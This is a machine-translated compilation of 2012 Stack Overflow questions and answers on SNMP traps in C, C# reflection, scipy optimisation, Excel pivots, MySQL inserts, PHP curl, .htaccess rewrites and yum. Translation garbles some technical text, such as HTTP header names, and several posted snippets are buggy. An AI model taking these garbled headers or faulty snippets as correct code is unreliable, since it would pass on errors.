（对不起，我误读了您的问题，这就是您如何关闭对缺少的“严格”杂注的验证。但是，我不得不添加它，因为我没有使用“严格”模式，所以大概它现在是最新的Studio 3 的版本？）

# c - 在 C 中使用 Net-SNMP 的简单 snmp 陷阱生成器程序？

> ID：13572603
> 
> 赞同：1
> 
> 时间：2012-11-26T20:26:28.600
> 
> 标签：c, snmp, net-snmp

我正在尝试创建一个简单的 SNMP 陷阱生成器程序，以便更好地理解 Net-SNMP 库。使用以下代码，我不断收到错误

> snmptrap：找到配置数据，但无法配置传输
> 
> 会话未打开

```
#include <net-snmp/net-snmp-config.h>
#include <net-snmp/net-snmp-includes.h>
#include <net-snmp/agent/net-snmp-agent-includes.h>

#include "snmptrap_simple.h"

int main (int argc, char **argv) {
  oid             objid_enterprise[] = { 1, 3, 6, 1, 4, 1, 3, 1, 1 };
  oid             objid_sysdescr[] = { 1, 3, 6, 1, 2, 1, 1, 1, 0 };
  oid             objid_sysuptime[] = { 1, 3, 6, 1, 2, 1, 1, 3, 0 };
  oid             objid_snmptrap[] = { 1, 3, 6, 1, 6, 3, 1, 1, 4, 1, 0 };

  netsnmp_session session, *ss;
  netsnmp_pdu    *pdu, *response;
  oid             name[MAX_OID_LEN];
  size_t          name_length;
  int             arg;
  int             status;
  char           *trap = NULL;
  char           *prognam;
  int             exitval = 0;

  session.version       = SNMP_VERSION_1;
  session.retries       = 2;
  char address[]        = "127.0.0.1";
  char *ptrAddress      = address;
  session.peername      = ptrAddress;
  u_char comm[]         = "public";
  const u_char *community = comm;
  session.community     = community;
  session.community_len = strlen(session.community);

  /* windows32 specific initialization (is a noop on unix) */
  SOCK_STARTUP;
  // open snmp session
  ss = snmp_open(&session);
  if (!ss) {
    snmp_perror("ack");
    snmp_sess_perror("snmptrap", &session);
    snmp_log(LOG_DEBUG, "Session did not open\n");
    exit(2);
  }
  snmp_log(LOG_DEBUG, "DEBUG OUTPUT");
  // create the PDU
  pdu = snmp_pdu_create(SNMP_MSG_TRAP);
  if ( !pdu ) {
      fprintf(stderr, "Failed to create trap PDU\n");
      SOCK_CLEANUP;
      exit(1);
  }

  // add variables to the PDU
  char *value;
  *value = '42';
  if(snmp_add_var (pdu, name, name_length, 'i', value)){
    //void snmp_perror(const char *prog_string)
    snmp_perror("add variable");
    SOCK_CLEANUP;
    exit(1);
  };

  send_trap_to_sess (&session, pdu);

  return 0;
} 
```

我究竟做错了什么？

我在这里有一个代码的 github 存储库：[https ://github.com/EhevuTov/tcp2snmp/blob/master/test/snmptrap_simple.c](https://github.com/EhevuTov/tcp2snmp/blob/master/test/snmptrap_simple.c)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-31T22:36:56.593

您可能只需要`init_snmp("snmptrap_simple");`在`snmp_open()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-21T21:53:24.647

你需要使用这个

```
snmp_sess_init(&ss); 
```

# c# - 对类列表中的数据进行总计的方法

> ID：13572604
> 
> 赞同：0
> 
> 时间：2012-11-26T20:26:29.270
> 
> 标签：c#, generics, reflection

这个月有两次，我不得不创建一共一堆类的记录。（两个不同的类），这将再次发生。在我看来，应该有一种简单的方法可以使用任何类的反射来做到这一点，而不必为每个类编写一个总计例程。

考虑：

```
private class ThisAndThat
{
    public int This { get; set; }
    public float That { get; set; }
    public double TheOther { get; set; }
    public string Whatever { get; set; }
} 
```

当我的代码开始运行时，我创建了一堆这样的代码，但我还需要一个完整的例程。类似于下面列出的 AddToTotal() ，其中添加了数字并忽略了字符串。

```
List<ThisAndThat> _Discovered = new List<ThisAndThat>(); 
ThisAndThat _Total = new List<ThisAndThat>; 
while( !Finished )
{
    ThisAndThat CurrentOne = GetAnotherOne(); 
    _Discovered.Add( CurrentOne ); 
    AddToTotal( _Total, CurrentOne ); 
} 
```

显然，这个示例类中的数字三个属性很容易编码，但我只是用 60 个数字成员编写了一个。我在反思中摸索了一会儿，但无法想出一个例程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:45:30.883

反射绝对可以做到这一点。这不是太难。这是使用您提供的类的示例：

```
var tat = new ThisAndThat();
tat.This = 1;
tat.That = 2.0F;
tat.TheOther = 3.0;
tat.Whatever = "Whatever";

var type = typeof(ThisAndThat);
var properties = type.GetProperties();

double total = 0.0;

foreach (System.Reflection.PropertyInfo pi in properties)
{
    switch (pi.PropertyType.ToString())
    {
        case "System.Int32": //int
            total += (int) pi.GetValue(tat, null);
            break;
        case "System.Double":
            total += (double) pi.GetValue(tat, null);
            break;
        case "System.Single": //float
            total += (float) pi.GetValue(tat, null);
            break;
    }
}

MessageBox.Show(total.ToString()); 
```

请注意，我的示例仅适用于属性。如果您有需要总计的字段，则必须在类型上使用 GetFields 方法。

您还应该注意处理其他数字类型，例如 Int64 等...

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-26T20:32:05.150

这是你要找的吗？

```
ThisAndThat thisThatSum = 0;

foreach(ThisAndThat tat in _Discovered)
{
    thisThatSum.This += tat.This;
    // do the same for other fields
} 
```

我确定一个 linq，方法也存在，但我必须喜欢做研究和东西才能把它交给你

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-26T20:45:04.253

Linq to sql 使得这对于任何 IEnumerable 都非常容易

```
 ThisAndThat item1 = new ThisAndThat();
    ThisAndThat item2 = new ThisAndThat();

    item1.TheOther = 1.00;
    item2.TheOther = 2.00;

    _Discovered.Add(item1);
    _Discovered.Add(item2);

    var amount = from p in _Discovered
                 select p.TheOther;

    Console.WriteLine("Amount total is {0}", amount.Sum()); 
```

# python - Solving an implicit quadratic system of 3 variables

> ID：13572605
> 
> 赞同：1
> 
> 时间：2012-11-26T20:26:30.850
> 
> 标签：python, numpy, system, implicit, quadratic

I am trying to solve a system of equations that has 3 variables and a variable number of equations.

Basically, the system is between 5 and 12 equations long, and regardless of how many equations there are, I am trying to solve for 3 variables.

It looks like this:

```
(x-A)**2 + (y-B)**2 + (z-C)**2 = (c(t-d))**2 
```

I know A,B,C, and the whole right side. A,B,C and the right side are all arrays of length n, where n varies randomly between 5 and 12\. So then we have a system of equations that changes in size. I believe I need to use numpy's lstsq function and do something like:

```
data,data1 = getData()        # I will have to do this for 2 unique systems.
A   = data[:,0]
B   = data[:,1]
C   = data[:,2]
tid = data[:,3]
P = (x-A)**2 + (y-B)**2 + (z-C)**2              
b = tid
solved = lstsq(P,b)
print solved 
```

This however doesn't work, as we know that x,y,z are implicit, and therefore need to be taken out of P in order for this to work. Help!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T09:29:12.407

您可能需要的是[scipy.optimize.minimize](http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.minimize.html#scipy.optimize.minimize) () ，它适用于任意（非线性）方程。numpy.linalg.lstsq() 只解决*线性*方程组，而且这个问题绝对是非线性的（虽然有一些技术可以线性化方程组，但我认为这不是你想要的）。

一个由 3 个变量组成的 >3 个方程组很可能没有解，因此您必须定义如何衡量给定“解”的好坏，即使它实际上并没有求解方程组。如何将此作为最小化问题取决于您实际尝试执行的物理或问题域解释。一种可能性是，对于以下方程（这是你的稍微重新排列的版本）

```
(x-A1)**2 + (y-B1)**2 + (z-C1)**2 - T1**2 = 0
(x-A2)**2 + (y-B2)**2 + (z-C2)**2 - T2**2 = 0
... 
```

尝试最小化所有左侧的绝对值之和（如果方程被精确求解，它应该为零）。换句话说，您想要产生以下函数的最小值的 x、y、z

```
sum( abs( (x-A1)**2 + (y-B1)**2 + (z-C1)**2 - T1**2 ) + abs( (x-A2)**2 + (y-B2)**2 + (z-C2)**2 - T2**2 ) + ... ) 
```

代码示例：v是(3,)的ndarray，包含x、y、z；和 A, B, C, tid 是 (N,) 的 ndarrays，其中 N 是方程的数量。

```
def F(v, A, B, C, tid):
    x = v[0]
    y = v[1]
    z = v[2]
    return numpy.sum( numpy.abs( (x-A)**2 + (y-B)**2 + (z-C)**2 - tid ) )

v_initial = numpy.array([x0, y0, z0]) # starting guesses
result = scipy.optimize.minimize(F, v_initial, args=(A, B, C, tid))
v = result.x
x, y, z = v.tolist() # the best solution found 
```

这应该接近工作，但我还没有测试过。您可能需要一些额外的参数来最小化（），例如方法，tol，...

# excel - 计算非数字数据的Excel数据透视表？

> ID：13572607
> 
> 赞同：1
> 
> 时间：2012-11-26T20:26:37.803
> 
> 标签：excel, pivot

我正在帮助一位同事解决问题，但我自己也遇到了一些困难。在完成一组课程后，他从学生回答的调查中收到一个 CSV 文件，并且他希望生成报告，显示每个问题中每个类别的回答数量（即 # 同意、# 非常同意等）。

CSV 文件的格式类似于：

```
DateTime     School     Class     Question 1        Question 2        Question 3     ... etc ...
========     ======     =====     ==========        ==========        ==========
1/1/2012       A          1       Agree             Strongly Agree    Disagree
1/1/2012       A          1       Disagree          Agree             Strongly Disagree
1/1/2012       A          2       Agree             Strongly Agree    Slightly Disagree
1/1/2012       A          1       Agree             Agree             Disagree
1/1/2012       A          2       Disagree          Disagree          Disagree
... etc 8,000 rows ... 
```

他想要的是一份类似这样的报告：

```
School     Class     Q1 Agree     Q1 Disagree    ...    Q1 Strongly Agree  ...
======     =====     ========     ===========          =================
  A          1          2             1                         0
  A          2          1             1                         0
... etc ... 
```

显然我正在查看数据透视表，但我遇到了如何定义数据透视表的问题。我不是 Excel 专家，但是当我们尝试各种选项时，我们得出的结果基本上是毫无意义的。

是否可以设置一个数据透视表，以一种有意义的方式提供这些数据？计算非数值实例并按学校和班级对计数进行分组？什么是一个好的（容易重复的）策略来完成这个？

感谢您的帮助，非常感谢。

（我们使用的是 Office 2007）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:48:57.737

用连接学校和班级和答案的公式填写第二张表。该表随后将如下所示：

```
Q1                Q2                           Q3
=================================================================
A1Q1:Agree        A1Q2:Strongly Agree          A1Q3:Disagree
A1Q1:Disagree     A1Q2:Agree                   A1Q3:Strongly Disagree
A2Q1:Agree        A2Q2:Strongly Agree          A2Q3:Slightly Disagree 
```

其中 A1 表示 School A Class 1。您甚至可以使用 VLookup 将文本替换为数字

您可以通过将此公式添加到虚拟表中的单元格 D3 来获得此信息：

```
 =sourcetable!$B3&sourcetable!$C3&D$1&":"&sourcetable!D3 
```

然后将其复制到每个单元格。

现在您所要做的就是创建一个这样的结果表：

```
 Q1           Q1                  Q1
School       Class         Agree       Disagree       Strongly Disagree   
========================================================================
A            1             formula 
```

公式在哪里

```
=countif(dummytable!C3:z999,$A4&B4&C$1&":"&C$2) 
```

对所有单元格重复此公式。

第一部分做什么以及它是如何做的应该很清楚。在生产级应用程序中，我会将文本（同意/不同意）替换为数字（Google for VLookup），当数据中有错字时您会看到。

第二部分计算字符串的所有出现次数（在本例中为 A1Q1:Agree）。这应该可以解决问题。如果要发布它，最好将结果“复制：粘贴值”到新表中......

您可以按原样重用 dummytable 和结果表。只需将新数据放入源表...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:33:07.187

选择您的数据范围作为数据透视表。

1.  将`Question 1`、`Class`和`School`拖到行标签框。
2.  将`Question 1`、`Question 2`和`Question 3`拖到“值”框。
3.  如果没有显示“Count of Question 1”，请单击下方的向下箭头`Value Field Settings.`
4.  在`Summarize by`选项卡中，选择计数。
5.  必要时重复。
6.  在另一张纸上，链接到特定的数据透视表单元格，以您希望的任何格式显示数据。

**编辑：我附上了一张图片作为视觉辅助。**

[http://i.imgur.com/2Emw3.jpg](http://i.imgur.com/2Emw3.jpg)

如果您有任何问题，请告诉我。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-30T02:21:12.350

问题是您的数据已全部准备好部分旋转。理想情况下，它将采用以下格式：

```
DateTime     School     Class     Question        Answer        
========     ======     =====     ==========      ==========        
1/1/2012       A          1       Question 1      Strongly Agree    
1/1/2012       A          1       Question 2      Agree 
```

ETC

这种格式将有助于更好地使用数据透视表。 [这是有关使用 Excel 2016 进行反透视的说明](http://www.excel-university.com/unpivot-excel-data/)

# mysql - sql中只向表中添加一个值

> ID：13572610
> 
> 赞同：17
> 
> 时间：2012-11-26T20:26:52.593
> 
> 标签：mysql, database

我有一个名为`student`( `rollno, name, sem, branch`)的表

如果我只想输入`INSERT`一个值（即只需要输入名称），查询是什么？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-26T20:37:49.167

要将值插入特定列，您首先必须指定要填充的列。查询将如下所示：

```
INSERT INTO your_table_name (your_column_name)
VALUES (the_value); 
```

要将值插入多个列，请用逗号分隔列名，并按照添加列名的顺序插入值：

```
INSERT INTO your_table_name (your_column_name_01, your_column_name_02)
VALUES (the_value_01, the_value_02); 
```

如果您不确定，请查看 W3Schools.com。他们通常用例子来解释。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-26T20:31:07.547

```
insert into student(name) values("The name you wan to insert"); 
```

注意不要忘记插入主键。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2020-05-07T00:02:10.440

首先，如果表都是空的，只想让列“名称”带有值，使用 INSERT INTO 很容易。[https://www.w3schools.com/sql/sql_insert.asp](https://www.w3schools.com/sql/sql_insert.asp)。

```
`INSERT INTO TABLE_NAME (COLUMN_NAME) VALUES ("the values")` 
```

其次，如果表中已经有一些值，并且只想为一列插入一些值，请使用 UPDATE。[https://www.w3schools.com/sql/sql_update.asp](https://www.w3schools.com/sql/sql_update.asp)

```
 UPDATE table_name SET column1 = value1 WHERE condition; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-26T20:27:52.887

```
insert into student (name)
select 'some name' 
```

或者

```
insert into student (name)
values ('some name') 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-26T20:29:13.527

如果其他列接受 null 或确实具有默认值，则以下工作：

```
INSERT INTO Student (name) VALUES('Jack'); 
```

更多细节可以从[参考手册:: 13.2.5 INSERT Syntax](http://dev.mysql.com/doc/refman/5.5/en/insert.html)中找到。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-05-27T12:09:06.787

执行此查询，如果您希望其余列为，请在查询中留空的单引号内`"#"`插入。`#`

此外，不需要在查询中定义列名。

```
insert into student values('','your name','',''); 
```

谢谢...

# objective-c - 如何设置 OSX 屏幕保护程序配置表？

> ID：13572627
> 
> 赞同：7
> 
> 时间：2012-11-26T20:28:01.177
> 
> 标签：objective-c, macos, osx-mountain-lion, screensaver

我正在为 OSX（Mountain Lion）开发屏幕保护程序，但在设置配置表时遇到问题（因此，当用户在系统偏好设置中单击“屏幕保护程序选项...”时，会出现我的选项）。互联网上似乎只有两三个关于编写 OSX 屏幕保护程序的教程，而且它们都是几年前的，所以这些材料并不能完全转化为 OSX 10.8 和 Xcode 4。

首先，在我的`ScreenSaverView.m`文件中，我有：

```
- (BOOL)hasConfigureSheet
{
    return NO;
}

- (NSWindow*)configureSheet
{
    return nil;
} 
```

...然而，在“系统偏好设置”中，“屏幕保护程序选项...”按钮仍然是可单击的（单击时没有任何反应），而不是像在“蔓藤花纹”屏幕保护程序中那样被禁用。

单击按钮时出现配置表的步骤是什么，为什么该按钮当前未禁用？

* * *

**编辑：**

我意识到为什么“屏幕保护程序选项...”按钮没有被禁用。我忘记包含`-(BOOL)hasConfigureSheet;`在`ScreenSaverView.h`文件中。然而，我关于如何让配置表出现的问题仍然存在。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-05T01:01:18.310

首先要做的事情：确保包含`ScreenSaver.framework`在您的项目中；它提供了必要的类`ScreenSaverView`和`ScreenSaverDefaults`.

你说你已经有一个名为`ScreenSaverView.m`. 再加上您还说您必须导出您的`-hasConfigureSheet`方法才能禁用“屏幕保护程序选项...”按钮。这让我想知道你是否`ScreenSaverView`按照你应该做的那样进行了子类化。（您是否`NSObject`改为子类化？）为您`ScreenSaverView`导出方法`-hasConfigureSheet`。您应该继承它，并覆盖其中的适当方法。

还有几件事：

您应该在项目中包含一个 xib 文件，其中包含配置表的 UI，并且您应该`IBOutlet`在子类的界面中提供 s 以引用面板和它包含的 UI 元素（您实际上需要插座的那些，那是）。

最后，您的 -configureSheet 方法应该以与此类似的方式获取配置表（在此示例中，`configSheet`将是您`IBOutlet`的其中一个）：

```
if (configSheet == nil)
{
    if ([NSBundle loadNibNamed:@"myConfigSheet" owner:self] == NO)
    {
        NSLog(@"load config sheet failed");
    }
}

// then retrieve your defaults and set up your sheet; you should
//  be working with ScreenSaverDefaults, a subclass of NSUserDefaults.

// then return 'configSheet' 
```

**编辑：**

如果我要告诉你一些你已经知道的事情，请提前道歉，但你确实说你在`configSheet`.

在`My_ScreensaverView.h`中，为您的面板声明一个出口：

```
IBOutlet id configSheet; 
```

请注意，我使用`id`而不是`NSWindow *`or `NSPanel *`，仅仅是因为我不知道您实际使用的工作表是什么类。（理想情况下，应该将 NSPanel 用于工作表。）

在您的 nib 文件中，确保`File's Owner`是`My_ScreensaverView`. 您可以通过选择此对象的图标然后使用身份检查器指定类来确定这一点。

`configSheet`在插座和面板之间建立连接。`File's Owner`一种方法是在从对象拖动到窗口或面板图标时按住 Control 键，然后`configSheet`从出现的弹出窗口中进行选择。

一如既往，祝您工作顺利。

# php - 使用 php curl 在 asp.net 页面上填写表格

> ID：13572629
> 
> 赞同：1
> 
> 时间：2012-11-26T20:28:08.513
> 
> 标签：php, asp.net, curl

有一个 asp.net 驱动的站点，我可以在成功登录后登录并填写表格下订单。这需要由我的服务器使用 curl 完成。

每当我使用浏览器执行此操作时，都没有什么特别之处。

我去 example.com/login.aspx。填写字段并将其发回。我为已登录的用户返回了一个索引页面。在此之后，我需要单击指向下订单表格的链接。这样做会给我一个表格，我填写并发回。这会产生下订单的想要结果。分析来源显示页面是通过javascript提交的，但如果请求相同，服务器无法知道请求是如何发送的。在此过程中，我跟踪了从浏览器发送的所有发布请求。

有了所有的帖子请求，我编写了一些代码来对 curl 做同样的事情。算法是：

1.  发送get请求获取example.com/login.aspx页面
2.  解析任何隐藏字段的响应（因为它们用于模拟全状态连接）
3.  将状态和登录数据发布到 example.com/login.aspx
4.  解析状态发回并更新它
5.  获取下单表格
6.  再次解析并更新状态
7.  发布我的浏览器发送的状态和相同的发布数据
8.  将信息打印到文件而不是 STDERR

在此过程中，cookie 与 curl 一起使用。

一切都很顺利，直到最后一个 POST。我将原始表单返回给我，而不是“成功”或“失败”结果，没有提及验证错误。如果我故意填写乱码或使用浏览器将某些内容留空，则会显示验证错误。

我没有使用 asp.net 的经验，完全被困在这里，如果这个问题太具体，请原谅我。

问题：

**如果标题和帖子数据与我的浏览器完全相同，我的 curl 操作怎么会有不同的结果？**

为了完整性：

从浏览器发布：

> POST /DataEntry.aspx HTTP/1.1
> 
> 主办方：www.iftin.co
> 
> 用户代理：Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0
> 
> 接受：text/html,application/xhtml+xml,application/xml;q=0.9, */* ;q=0.8
> 
> 接受语言：nl,en-us;q=0.7,en;q=0.3
> 
> 接受编码：gzip，放气
> 
> 连接：保持活动
> 
> 推荐人： [https ://www.iftin.co/DataEntry.aspx](https://www.iftin.co/DataEntry.aspx)
> 
> Cookie：ASP.NET_SessionId=SomethingX；.hawAuth=SomethingY
> 
> 内容类型：application/x-www-form-urlencoded
> 
> 内容长度：10111

通过 Curl 发送帖子：

> POST /DataEntry.aspx HTTP/1.1
> 
> 用户代理：Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0
> 
> 主办方：www.iftin.co
> 
> 推荐人：[https ://www.iftin.co/DataEntry.aspx](https://www.iftin.co/DataEntry.aspx)
> 
> Cookie:.hawAuth=SomethingZ; ASP.NET_SessionId=SomethingW
> 
> 接受：text/html,application/xhtml+xml,application/xml;q=0.9, */* ;q=0.8
> 
> 接受语言：nl,en-us;q=0.7,en;q=0.3
> 
> 接受编码：gzip，放气
> 
> 连接：保持活动
> 
> 内容长度：25236
> 
> 期望：100-继续
> 
> 内容类型：application/x-www-form-urlencoded;boundary=----------------------------5bb8ec4e5ecc

如果人们想看一些代码，请告诉我。感谢您阅读并花时间在这上面。

写完这篇文章后，我注意到我的 curl 请求的 Content-Length 比我的浏览器请求大得多。我将浏览器 Post 正文中的所有参数复制到我的代码中，并将其传递给 curl 数组。

**所以 curl 默认要在请求中添加一些数据。是这样吗？**

**CURLOPT_SSL_VERIFYPEER 设置为 false，而页面使用 SSL。会是这样吗？为什么？**

# php - .htaccess 根据请求的 URL 打开 php 模板文件

> ID：13572631
> 
> 赞同：2
> 
> 时间：2012-11-26T20:28:14.840
> 
> 标签：php, .htaccess, mod-rewrite

我正在尝试找出一种将模板 php 文件加载为请求的 url/文件名的方法：

我有一个包含数百页的目录，并且希望能够从模板文件动态生成它们，而不是有数百个包含相同代码的文件。`basename()`理想情况下，将有一个 php 文件`/gallery/template.php`使用`/gallery/example.html`.

我觉得这可能可以使用 .htaccess 和 mod-rewrite 来完成，但我还没有找到它的实际示例。我试图避免使用 GET，但如果有更好的方法来实现这种效果，我愿意接受建议。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:40:09.357

基本上，您想要执行前端控制器模式。如果您的画廊子目录中的所有内容都需要重定向（即没有不需要路由到 template.php 的图像文件或子目录），您可以做一个简单`RewriteRule`的实现。只需将其放在 .htaccess 或您的 apache .conf 文件中

```
RewriteEngine On
RewriteRule ^/?gallery/.*\.html$ /gallery/template.php [QSA,L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:40:25.817

我没有测试它，但这里有一个例子：

```
RewriteEngine On
RewriteRule ^gallery/.*/?$ gallery/template.php [NC,L] 
```

字符串 'gallery' 必须在请求的 URL 中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:45:19.917

查看[$_REQUEST 手册](http://php.net/manual/en/reserved.variables.server.php)`$_SERVER['PATH_INFO']`页。使用它，你可以得到类似的东西

```
http://example.com/index.php/path/to/your/template 
```

调用`index.php`将整个`/path/to/your/template`作为字符串传递给`$_REQUEST['PATH_INFO']`.

在您的`.htaccess`文件中，您可以执行以下操作：

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    #Checks to see if the user is attempting to access a valid file,
    #such as an image or css document, if this isn't true it sends the
    #request to index.php
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php/$1 [L]
</IfModule> 
```

（从[这里](http://ellislab.com/forums/viewthread/195488/)获取的重写规则。我自己还没有完成 mod-rewrite 部分，所以我不能保证这会起作用）。

这将采取类似的方式`http://example.com/path/to/your/template`并让服务器将其视为`http://example.com/index.php/path/to/your/template`，使其将所有内容传递给您的`index.php`文件。

之后，如何加载模板取决于您。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T20:43:21.140

您可能希望使用 AJAX 作为完成您想要的方法的方法。你熟悉 AJAX 吗？如果您发布有关您的具体情况和期望结果的更多详细信息，也许我们可以为您提供进一步的帮助。

查看[这些简单的 AJAX 示例](https://stackoverflow.com/questions/13499559/make-div-text-change-on-click-based-on-php-data-using-ajax/13501242#13501242)，并查看[此视频资源](http://thenewboston.org/watch.php?cat=11&number=171)。

# objective-c - 电池增加 5% 时经过的时间

> ID：13572636
> 
> 赞同：1
> 
> 时间：2012-11-26T20:28:45.377
> 
> 标签：objective-c, nstimer, battery, batterylevel

我想知道是否有办法让电池增加 5% 时经过的时间。例如，我怎么知道 60% 和 65% 之间经过了多少时间？我想我可以用 NSTimer 做到这一点，但我无法做到这一点，有人可以帮助我吗？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:39:37.660

如果您是为 Mac 执行此操作，请查看[此问题](https://stackoverflow.com/questions/272552/battery-status-in-osx)以了解如何在 Mac 中获得电池寿命；

如果您正在为 iOS 执行此操作，请查看[此问题](https://stackoverflow.com/questions/1469549/iphone-calculating-battery-life?rq=1)以了解如何在 iOS 中获得电池寿命。

只需使用您的 NSTimer 触发函数以每 x 秒获取电池寿命，当它达到 60% 时，使用 捕获时间戳`NSDate`，然后当达到 65% 时，捕获另一个时间戳并比较两个时间戳以获得时间差：[所以问题：如何获得 2 个 NSDate 对象之间的时间](https://stackoverflow.com/questions/1792512/get-time-between-two-times-of-the-day)。

祝你好运。

编辑：

根据您的平台，所有获取电池百分比的方法都在第一个或第二个链接中。如果您希望它确定从现在到上/下 5% 之间的时间：

```
//both percent and date should be properties or instance variables (NSDate and float, respectively)
//You should probably also make the timer one as well, so you can stop it in any method with [tmr invalidate];
date = [NSDate date];
percent = [self getBatteryPercent];

NSTimer* tmr = [NSTimer scheduledTimerWithInterval:1 target:self selector:@selector(someMethod) userInfo:nil repeats:YES];

- (float)getBatteryPercent
{
    //You'll have to get this code from one of those methods (first or second link)
}

- (void)someMethod
{
    float newPercent = [self getBatteryPercent];
    if(percent - newPercent == 5.0 || percent - newPercent == -5.0)
    {
        //Get the time between timestamps
        NSDate* newDate = [NSDate date];
        //See third link for how to get the time difference between date and newDate
    }
} 
```

剩下的就看你了。

# emulation - Z80 DAA 标志受影响

> ID：13572638
> 
> 赞同：3
> 
> 时间：2012-11-26T20:28:58.010
> 
> 标签：emulation, cpu, instruction-set, z80

在以下链接中，

[http://www.z80.info/z80syntx.htm#DAA](http://www.z80.info/z80syntx.htm#DAA)

我对设置 H 标志的条件感到困惑。描述说要查看表格，但与 C 不同，在 DAA 之后有 C 列，对于 H，DAA 之前只有 H ...

那么，在 DAA 之后应该如何更新 H 呢？谢谢您的帮助！！欣赏它！:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-27T07:58:52.967

[Sean Young 的文档（PDF；第 18 页）](http://datasheets.chipdb.org/Zilog/Z80/z80-documented-0.90.pdf)提供了确切的情况。简而言之，如果您添加了 H，那么当您最终在低半字节中得到大于 9 的结果时，就会准确设置 H。如果减去，则 H 的设置与操作前设置的完全相同，并且低半字节的结果小于 6。

# php - 从转换命令到 ImageMagick 的直接 PHP

> ID：13572639
> 
> 赞同：0
> 
> 时间：2012-11-26T20:29:00.250
> 
> 标签：php, imagemagick, imagick, imagemagick-convert

我要搬到一家不允许我执行`convert`ImageMagick 命令的新托管公司。所以我现在必须尝试通过直接的 PHP 来实现。我花了相当多的时间试图弄清楚它，并且在我看到的每一个地方，人们都建议`convert`像我一样使用该命令。我将不胜感激在直接 PHP 中编写以下命令的任何帮助或指导。

```
# Applies overlay $filter_image to the original $image
convert $image ( -clone 0 -alpha off $filter_image -compose SoftLight -composite ) -compose SrcIn -composite $output_image 
```

和

```
# Apply a blur to an image
convert $image -blur 0x$blur_radius $output_image 
```

**更新**：

我已经弄清楚了语法并将其发布为答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T22:17:13.090

祝乔好运；我建议更改为允许您使用 exec 的主机。

我在我的网站上有一些 imagick 函数的示例，您可以将它们拼凑在一起：[http ://www.rubblewebs.co.uk/imagick/functions/function.php](http://www.rubblewebs.co.uk/imagick/functions/function.php)

我刚刚注意到我发布了 Imagemagick 代码而不是 Imagick ！这就是你现在知道的 Imagick 的模糊代码：

bool blurImage ( float $radius , float $sigma [, int $channel ] )

```
<?php  
$im = new Imagick($input); 
$im->blurImage( 0, 3 ); 
$im->writeImage('blurImage.jpg');  
$im->destroy(); 
?> 
```

可能值得在您的帖子中添加一个 Imagick 标签，因为这是您想要使用的？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T00:54:32.843

我终于自己想通了。这是解决方案，以防其他人遇到此问题。

模糊图像...

```
$imagick = new Imagick($image);
$imagick->blurImage(0,$blur_radius);
$imagick->writeImage($output_image); 
```

为图像添加叠加层...

```
$imagick = new Imagick($image);
$overlay = new Imagick($filter_image);

$imagick->compositeImage($overlay, imagick::COMPOSITE_SOFTLIGHT, 0, 0);
$imagick->writeImage($output_image); 
```

您也可以轻松地组合这两种方法并模糊图像，然后向其添加复合叠加层。

```
$imagick = new Imagick($image);
$imagick->blurImage(0,$blur_radius);

$overlay = new Imagick($filter_image);
$imagick->compositeImage($overlay, imagick::COMPOSITE_SOFTLIGHT, 0, 0);

$imagick->writeImage($output_image); 
```

# linux - 安装 python 2.7.3 后 yum 坏了

> ID：13572642
> 
> 赞同：3
> 
> 时间：2012-11-26T20:29:04.753
> 
> 标签：linux, yum

我安装了 libxml2-2.9.0 和 libxslt-1.1.27 然后 yum 被破坏了我运行的任何 yum 命令我得到了结果：

```
There was a problem importing one of the Python modules
required to run yum. The error leading to this problem was:

   No module named yum

Please install a package which provides this module, or
verify that the module is installed correctly.

It's possible that the above module doesn't match the
current version of Python, which is:
2.4.3 (#1, Jan 21 2009, 01:11:33) 
[GCC 4.1.2 20071124 (Red Hat 4.1.2-42)]

If you cannot solve this problem yourself, please go to 
the yum faq at:
  http://yum.baseurl.org/wiki/Faq 
```

然后我认为python版本太旧了，安装python 2.7.3并从头开始安装，经过一些错误的试验，它变得越来越糟，现在当我运行'python -V'时，我得到了'Python 2.7.3'版本，当我运行“/usr/bin/python -V”时，它返回“python-2.4.3-24.el5”，无论我做什么，yum 仍然被该消息破坏。我怎样才能让百胜回来？我的操作系统是：linux 2.6.18-164.11.1.el5 x86_64 GNU/Linux

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:44:16.757

请参阅[常见问题解答](http://yum.baseurl.org/wiki/Faq#Q.7%3aIinstalledanewversionofyumorupgradedmywholesystemandnowwhenIrunyumIgetanerrorsayingTheyumlibrariesdonotseemtobeavailableonyoursystemforthisversionofpythonandPleasemakesurethepackageyouusedtoinstallyumwasbuiltforyourinstallofpython.WhatswrongwiththeyumpackageIvegotormyPythoninstallationandhowdoIfixit)：

